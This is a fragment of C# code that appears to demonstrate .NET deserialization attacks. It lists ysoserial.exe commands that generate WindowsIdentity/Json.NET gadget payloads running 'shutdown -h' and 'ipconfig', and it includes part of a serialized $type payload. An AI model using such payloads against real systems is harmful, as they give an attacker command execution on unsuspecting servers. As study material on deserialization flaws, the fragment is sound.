...
#pragma warning restore SYSLIB0011 // Type or member is obsolete
        ...
        command = @"ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -c ""shutdown -h"" > ""<path>\payload-use-case-2.txt""";
        serializedOutput = @"{
        ...
        index++;
        classFormatterPair = new Tuple<string, string>("WindowsIdentity", "Json.NET");
        command = @"ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -c ""ipconfig > ""<path>\netconfig.txt\"""" > ""<path>\payload-use-case-3.txt""";
        serializedOutput = @"{
                    '$type': 'System.Security.Principal.WindowsIdentity, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
        ...
        // Use case 3 - WindowsIdentity and Json.NET
        PrintSummary(index, classFormatterPair, command, serializedOutput);
